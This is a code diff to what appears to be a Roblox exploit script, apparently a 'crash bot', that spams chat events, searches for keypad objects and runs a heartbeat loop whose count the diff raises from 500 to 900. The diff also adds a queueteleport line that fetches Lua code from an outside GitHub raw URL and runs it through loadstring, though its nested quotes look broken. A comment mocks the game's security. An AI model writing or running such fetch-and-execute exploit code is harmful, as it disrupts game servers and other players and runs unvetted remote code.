@@ -73,6 +73,8 @@ local args = {
 }
 
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+queueteleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()")
 -- shitty game security lmfao
 local function findGearMachineKeypads()
     local keypads = {}
@@ -147,7 +149,7 @@ for _, keypad in ipairs(foundKeypads) do
 end
 local RunService = game:GetService("RunService")
 local loopCount = 0 -- Counter to track the number of iterations
-local maxLoops = 500 -- Maximum number of loops to run
+local maxLoops = 900 -- Maximum number of loops to run
 
 local connection
 connection = RunService.Heartbeat:Connect(function()
